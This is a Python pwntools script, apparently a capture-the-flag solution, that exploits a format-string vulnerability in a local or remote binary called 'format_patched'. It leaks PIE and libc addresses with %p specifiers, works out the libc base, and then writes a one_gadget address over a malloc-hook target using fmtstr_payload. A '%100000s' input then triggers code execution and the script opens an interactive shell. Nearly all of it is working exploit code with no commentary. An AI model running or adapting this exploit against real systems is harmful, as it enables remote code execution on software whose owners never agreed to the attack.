from pwn import *
import os
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

## 0x11f1
gdbscript = '''
init-pwndbg
breakrva 0x11f1
continue
'''.format(**locals())

exe = './format_patched'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'
# context.log_level = 'ERROR'
# context.log_level = 'INFO'

# library = '/lib/x86_64-linux-gnu/libc.so.6'
library = './libc6_2.27-3ubuntu1_amd64.so' # remote libc
libc = context.binary = ELF(library, checksec=False)

# # LEAKING POTENTIAL LIBC BASE
# sh = start()
# for i in range(200):
#     sh.sendline('%{}$p'.format(i))
#     get = sh.recvline().strip()
#     print(str(i), ':', get)

# GET FORMAT STRINGS OFFSET
sh = process(exe)
def exploit(payload):
    sh.sendline(payload)
    return sh.recvline().strip()

format_strings = FmtStr(execute_fmt=exploit)
log.success('OFFSET --> %d', format_strings.offset)

sh = start()
#pause()
# # sh.sendline('%37$p.%1$p')
# sh.sendline('%37$p.%28$p') # 28 _IO_file_jumps
sh.sendline('%37$p.%2$p')
get = sh.recvline().strip()
leaked_pie = int(get[:14], 16)
log.success('LEAKED PIE --> %#0x', leaked_pie)
elf.address = leaked_pie - 0x126d # 4717
log.success('PIE BASE --> %#0x', elf.address)

leaked_libc = int(get[15:], 16)
log.success('LEAKED LIBC --> %#0x', leaked_libc)
libc.address = leaked_libc - 0x3ed8d0 # 4118736
log.success('LIBC BASE --> %#0x', libc.address)

malloc_hook = libc.address + 0x98700
log.success('MALLOC HOOK --> %#0x', malloc_hook)

one_gadget = libc.address + 0x4f322
malloc = libc.address + 0x3ebc30

payload = fmtstr_payload(format_strings.offset, {malloc:one_gadget})
sh.sendline(payload)
sh.sendline(b'%100000s') # GOT RCE AT 100000s.

sh.interactive()
